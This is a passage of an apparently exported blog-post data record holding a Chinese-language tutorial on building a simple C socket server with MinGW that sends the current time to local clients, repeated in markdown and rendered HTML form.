argc,char *argv[])\n{\n\t//serverfd服务端套接字描述符，connectfd客户端套接字描述符\n\tint serverfd,connectfd;\n\tstruct sockaddr_in serveraddr;\n\tchar buff[1024];\n\ttime_t tlick;\n\tint iRet;\n\n\t#ifdef MINGW32\n\t//Winsows下启用socket\n\tWSADATA wsadata;\n\tif(WSAStartup(MAKEWORD(1,1),&wsadata)==SOCKET_ERROR)\n\t{\n\t\tprintf(\"WSAStartup() fail\\n\");\n\t\texit(0);\n\t}\n\t#endif\n\n\t//新建server socket\n\tprintf(\"socket()\\n\");\n\t//SOCK_STREAM提供面向连接的稳定数据传输，即TCP协议\n\tserverfd=socket(AF_INET,SOCK_STREAM,0);\n\tif(serverfd==-1)\n\t{\n\t\tprintf(\"socket() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//清零\n\tmemset(&serveraddr,0,sizeof(serveraddr));\n\n\t//设置协议 AF_INET:ipv4地址（32位的）与端口号（16位的）的组合\n\tserveraddr.sin_family=AF_INET;\n\t//设置IP 127.0.0.1\n\tserveraddr.sin_addr.s_addr=inet_addr(\"127.0.0.1\");\n\t//设置Port\n\tserveraddr.sin_port=htons(1024);\n\n\t//绑定端口，监听1024端口的任何请求\n\tprintf(\"bind()\\n\");\n\tiRet=bind(serverfd,(struct sockaddr*)&serveraddr,sizeof(serveraddr));\n\tif(iRet==-1)\n\t{\n\t\tprintf(\"bind() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//监听端口，最大并发数10\n\tprintf(\"listen()\\n\");\n\tiRet=listen(serverfd,LISTENQ);\n\tif(iRet==-1)\n\t{\n\t\tprintf(\"listen() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//接受请求，发送主机时间\n\tfor(;;)\n\t{\n\t\tprintf(\"Waiting for connection...\\n\");\n\t\t//接受请求\n\t\tconnectfd=accept(serverfd,(struct sockaddr*)NULL,NULL);\n\t\t//获取时间 \n\t\ttlick=time(NULL);\n\t\t//格式化时间 \n\t\tsnprintf(buff,sizeof(buff),\"From mys:\\n%s\",ctime(&tlick));\n\t\t//写入时间\n\t\t//关闭请求\n\t\t#ifdef MINGW32\n\t\tsend(connectfd,buff,strlen(buff),0);\n\t\tclosesocket(connectfd);\n\t\t#else\n\t\twrite(connectfd,buff,strlen(buff));\n\t\tclose(connectfd);\n\t\t#endif\n\t}\n\n\t#ifdef MINGW32\n\t//Winsows下关闭socket\n\tclosesocket(serverfd);\n\tWSACleanup();\n\t#endif\n\n\t//退出\n\texit(0);\n}\n\n```\n编译:gcc -g -o server server.c -l wsock32\n\n如果你装了MinGW,你也可以尝试一下。","source":"_posts/c-5.md","raw":"---\ntitle: C语言之socket 简易服务端\ndate: 2016-4-12\ndesc: mingw socket\n---\n今年有两个目标，一个是做开源项目，第二个是用C写一个网络服务。C写网络服务Socket是基础，首先需要了解socket的用法。服务端socket操作步骤:1.创建socket,2.绑定地址及端口,3.接收请求,4.发送数据。\n# 函数\n1.创建socket:\nint socket(int domain, int type, int protocol);\ndomain：协议域\ntype：指定Socket类型。\nprotocol：指定协议。\n返回值：如果调用成功就返回新创建的套接字的描述符，如果失败就返回-1。\n\n2.绑定地址级端口\nint bind(SOCKET socket, const struct sockaddr* address, socklen_t address_len);\n参数说明：\nsocket：是一个套接字描述符。\naddress：是一个sockaddr结构指针，该结构中包含了要结合的地址和端口号。\naddress_len：确定address缓冲区的长度。\n返回值：如果函数执行成功，返回值为0，否则为SOCKET_ERROR。\n\n3.接收连接请求\nint accept( int fd, struct socketaddr* addr, socklen_t* len);\n参数说明：\nfd：套接字描述符。\naddr：返回连接着的地址\nlen：接收返回地址的缓冲区长度\n返回值：成功返回客户端的文件描述符，失败返回-1。\n\n4.发送数据\nint send(int fd, const void * msg, int len, unsigned int falgs);\nfd：套接字描述符。\nmsg: 数据内容。\nlen: 数据长度。\n返回值：成功则返回实际传送出去的字符数, 失败返回-1.\n\n<!-- more -->\n# 服务端示例\n新建server.c文件\n``` C\n#define MINGW32\n \n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n \n#ifdef MINGW32\n#include <winsock2.h>\n#else\n#include <sys/socket.h>\n#include <arpa/inet.h>\n#endif\n \n#define LISTENQ 10\n \nint main(int argc,char *argv[])\n{\n\t//serverfd服务端套接字描述符，connectfd客户端套接字描述符\n\tint serverfd,connectfd;\n\tstruct sockaddr_in serveraddr;\n\tchar buff[1024];\n\ttime_t tlick;\n\tint iRet;\n\n\t#ifdef MINGW32\n\t//Winsows下启用socket\n\tWSADATA wsadata;\n\tif(WSAStartup(MAKEWORD(1,1),&wsadata)==SOCKET_ERROR)\n\t{\n\t\tprintf(\"WSAStartup() fail\\n\");\n\t\texit(0);\n\t}\n\t#endif\n\n\t//新建server socket\n\tprintf(\"socket()\\n\");\n\t//SOCK_STREAM提供面向连接的稳定数据传输，即TCP协议\n\tserverfd=socket(AF_INET,SOCK_STREAM,0);\n\tif(serverfd==-1)\n\t{\n\t\tprintf(\"socket() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//清零\n\tmemset(&serveraddr,0,sizeof(serveraddr));\n\n\t//设置协议 AF_INET:ipv4地址（32位的）与端口号（16位的）的组合\n\tserveraddr.sin_family=AF_INET;\n\t//设置IP 127.0.0.1\n\tserveraddr.sin_addr.s_addr=inet_addr(\"127.0.0.1\");\n\t//设置Port\n\tserveraddr.sin_port=htons(1024);\n\n\t//绑定端口，监听1024端口的任何请求\n\tprintf(\"bind()\\n\");\n\tiRet=bind(serverfd,(struct sockaddr*)&serveraddr,sizeof(serveraddr));\n\tif(iRet==-1)\n\t{\n\t\tprintf(\"bind() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//监听端口，最大并发数10\n\tprintf(\"listen()\\n\");\n\tiRet=listen(serverfd,LISTENQ);\n\tif(iRet==-1)\n\t{\n\t\tprintf(\"listen() fail\\n\");\n\t\texit(0);\n\t}\n\n\t//接受请求，发送主机时间\n\tfor(;;)\n\t{\n\t\tprintf(\"Waiting for connection...\\n\");\n\t\t//接受请求\n\t\tconnectfd=accept(serverfd,(struct sockaddr*)NULL,NULL);\n\t\t//获取时间 \n\t\ttlick=time(NULL);\n\t\t//格式化时间 \n\t\tsnprintf(buff,sizeof(buff),\"From mys:\\n%s\",ctime(&tlick));\n\t\t//写入时间\n\t\t//关闭请求\n\t\t#ifdef MINGW32\n\t\tsend(connectfd,buff,strlen(buff),0);\n\t\tclosesocket(connectfd);\n\t\t#else\n\t\twrite(connectfd,buff,strlen(buff));\n\t\tclose(connectfd);\n\t\t#endif\n\t}\n\n\t#ifdef MINGW32\n\t//Winsows下关闭socket\n\tclosesocket(serverfd);\n\tWSACleanup();\n\t#endif\n\n\t//退出\n\texit(0);\n}\n\n```\n编译:gcc -g -o server server.c -l wsock32\n\n如果你装了MinGW,你也可以尝试一下。","slug":"c-5","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llst0008g2x6x2ruzu7j","content":"<p>今年有两个目标，一个是做开源项目，第二个是用C写一个网络服务。C写网络服务Socket是基础，首先需要了解socket的用法。服务端socket操作步骤:1.创建socket,2.绑定地址及端口,3.接收请求,4.发送数据。</p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>1.创建socket:<br>int socket(int domain, int type, int protocol);<br>domain：协议域<br>type：指定Socket类型。<br>protocol：指定协议。<br>返回值：如果调用成功就返回新创建的套接字的描述符，如果失败就返回-1。</p>\n<p>2.绑定地址级端口<br>int bind(SOCKET socket, const struct sockaddr* address, socklen_t address_len);<br>参数说明：<br>socket：是一个套接字描述符。<br>address：是一个sockaddr结构指针，该结构中包含了要结合的地址和端口号。<br>address_len：确定address缓冲区的长度。<br>返回值：如果函数执行成功，返回值为0，否则为SOCKET_ERROR。</p>\n<p>3.接收连接请求<br>int accept( int fd, struct socketaddr<em> addr, socklen_t</em> len);<br>参数说明：<br>fd：套接字描述符。<br>addr：返回连接着的地址<br>len：接收返回地址的缓冲区长度<br>返回值：成功返回客户端的文件描述符，失败返回-1。</p>\n<p>4.发送数据<br>int send(int fd, const void * msg, int len, unsigned int falgs);<br>fd：套接字描述符。<br>msg: 数据内容。<br>len: 数据长度。<br>返回值：成功则返回实际传送出去的字符数, 失败返回-1.</p>\n<a id=\"more\"></a>\n<h1 id=\"服务端示例\"><a href=\"#服务端示例\" class=\"headerlink\" title=\"服务端示例\"></a>服务端示例</h1><p>新建server.c文件<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MINGW32</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;winsock2.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;arpa/inet.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LISTENQ 10</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> *argv[])</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//serverfd服务端套接字描述符，connectfd客户端套接字描述符</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> serverfd,connectfd;</span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> sockaddr_in serveraddr;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buff[<span class=\"number\">1024</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">time_t</span> tlick;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> iRet;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下启用socket</span></span><br><span class=\"line\">\tWSADATA wsadata;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(WSAStartup(MAKEWORD(<span class=\"number\">1</span>,<span class=\"number\">1</span>),&amp;wsadata)==SOCKET_ERROR)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"WSAStartup() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//新建server socket</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"socket()\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//SOCK_STREAM提供面向连接的稳定数据传输，即TCP协议</span></span><br><span class=\"line\">\tserverfd=socket(AF_INET,SOCK_STREAM,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(serverfd==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"socket() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//清零</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;serveraddr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(serveraddr));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置协议 AF_INET:ipv4地址（32位的）与端口号（16位的）的组合</span></span><br><span class=\"line\">\tserveraddr.sin_family=AF_INET;</span><br><span class=\"line\">\t<span class=\"comment\">//设置IP 127.0.0.1</span></span><br><span class=\"line\">\tserveraddr.sin_addr.s_addr=inet_addr(<span class=\"string\">\"127.0.0.1\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//设置Port</span></span><br><span class=\"line\">\tserveraddr.sin_port=htons(<span class=\"number\">1024</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//绑定端口，监听1024端口的任何请求</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"bind()\\n\"</span>);</span><br><span class=\"line\">\tiRet=bind(serverfd,(<span class=\"keyword\">struct</span> sockaddr*)&amp;serveraddr,<span class=\"keyword\">sizeof</span>(serveraddr));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(iRet==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"bind() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//监听端口，最大并发数10</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"listen()\\n\"</span>);</span><br><span class=\"line\">\tiRet=listen(serverfd,LISTENQ);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(iRet==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"listen() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//接受请求，发送主机时间</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(;;)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"Waiting for connection...\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//接受请求</span></span><br><span class=\"line\">\t\tconnectfd=accept(serverfd,(<span class=\"keyword\">struct</span> sockaddr*)<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//获取时间 </span></span><br><span class=\"line\">\t\ttlick=time(<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t\t<span class=\"comment\">//格式化时间 </span></span><br><span class=\"line\">\t\t<span class=\"built_in\">snprintf</span>(buff,<span class=\"keyword\">sizeof</span>(buff),<span class=\"string\">\"From mys:\\n%s\"</span>,ctime(&amp;tlick));</span><br><span class=\"line\">\t\t<span class=\"comment\">//写入时间</span></span><br><span class=\"line\">\t\t<span class=\"comment\">//关闭请求</span></span><br><span class=\"line\">\t\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t\tsend(connectfd,buff,<span class=\"built_in\">strlen</span>(buff),<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\tclosesocket(connectfd);</span><br><span class=\"line\">\t\t<span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\">\t\twrite(connectfd,buff,<span class=\"built_in\">strlen</span>(buff));</span><br><span class=\"line\">\t\tclose(connectfd);</span><br><span class=\"line\">\t\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下关闭socket</span></span><br><span class=\"line\">\tclosesocket(serverfd);</span><br><span class=\"line\">\tWSACleanup();</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//退出</span></span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>编译:gcc -g -o server server.c -l wsock32</p>\n<p>如果你装了MinGW,你也可以尝试一下。</p>\n","excerpt":"<p>今年有两个目标，一个是做开源项目，第二个是用C写一个网络服务。C写网络服务Socket是基础，首先需要了解socket的用法。服务端socket操作步骤:1.创建socket,2.绑定地址及端口,3.接收请求,4.发送数据。</p>\n<h1 id=\"函数\"><a href=\"#函数\" class=\"headerlink\" title=\"函数\"></a>函数</h1><p>1.创建socket:<br>int socket(int domain, int type, int protocol);<br>domain：协议域<br>type：指定Socket类型。<br>protocol：指定协议。<br>返回值：如果调用成功就返回新创建的套接字的描述符，如果失败就返回-1。</p>\n<p>2.绑定地址级端口<br>int bind(SOCKET socket, const struct sockaddr* address, socklen_t address_len);<br>参数说明：<br>socket：是一个套接字描述符。<br>address：是一个sockaddr结构指针，该结构中包含了要结合的地址和端口号。<br>address_len：确定address缓冲区的长度。<br>返回值：如果函数执行成功，返回值为0，否则为SOCKET_ERROR。</p>\n<p>3.接收连接请求<br>int accept( int fd, struct socketaddr<em> addr, socklen_t</em> len);<br>参数说明：<br>fd：套接字描述符。<br>addr：返回连接着的地址<br>len：接收返回地址的缓冲区长度<br>返回值：成功返回客户端的文件描述符，失败返回-1。</p>\n<p>4.发送数据<br>int send(int fd, const void * msg, int len, unsigned int falgs);<br>fd：套接字描述符。<br>msg: 数据内容。<br>len: 数据长度。<br>返回值：成功则返回实际传送出去的字符数, 失败返回-1.</p>","more":"<h1 id=\"服务端示例\"><a href=\"#服务端示例\" class=\"headerlink\" title=\"服务端示例\"></a>服务端示例</h1><p>新建server.c文件<br><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MINGW32</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;winsock2.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">else</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/socket.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;arpa/inet.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LISTENQ 10</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc,<span class=\"keyword\">char</span> *argv[])</span></span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//serverfd服务端套接字描述符，connectfd客户端套接字描述符</span></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> serverfd,connectfd;</span><br><span class=\"line\">\t<span class=\"keyword\">struct</span> sockaddr_in serveraddr;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buff[<span class=\"number\">1024</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">time_t</span> tlick;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> iRet;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> MINGW32</span></span><br><span class=\"line\">\t<span class=\"comment\">//Winsows下启用socket</span></span><br><span class=\"line\">\tWSADATA wsadata;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(WSAStartup(MAKEWORD(<span class=\"number\">1</span>,<span class=\"number\">1</span>),&amp;wsadata)==SOCKET_ERROR)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"WSAStartup() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//新建server socket</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"socket()\\n\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//SOCK_STREAM提供面向连接的稳定数据传输，即TCP协议</span></span><br><span class=\"line\">\tserverfd=socket(AF_INET,SOCK_STREAM,<span class=\"number\">0</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(serverfd==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"socket() fail\\n\"</span>);</span><br><span class=\"line\">\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//清零</span></span><br><span class=\"line\">\t<span class=\"built_in\">memset</span>(&amp;serveraddr,<span class=\"number\">0</span>,<span class=\"keyword\">sizeof</span>(serveraddr));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//设置协议 AF_INET:ipv4地址（32位的）与端口号（16位的）的组合</span></span><br><span class=\"line\">\tserveraddr.sin_family=AF_INET;</span><br><span class=\"line\">\t<span class=\"comment\">//设置IP 127.0.0.1</span></span><br><span class=\"line\">\tserveraddr.sin_addr.s_addr=inet_addr(<span class=\"string\">\"127.0.0.1\"</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//设置Port</span></span><br><span class=\"line\">\tserveraddr.sin_port=htons(<span class=\"number\">1024</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//绑定端口，监听1024端口的任何请求</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"bind()\\n\"</span>);</span><br><span class=\"line\">\tiRet=bind(serverfd,(<span class=\"keyword\">struct</span> sockaddr*)&amp;serveraddr,<span class=\"keyword\">sizeof</span>(serveraddr));</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(iRet==<span class=\"number\">-1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"bind() 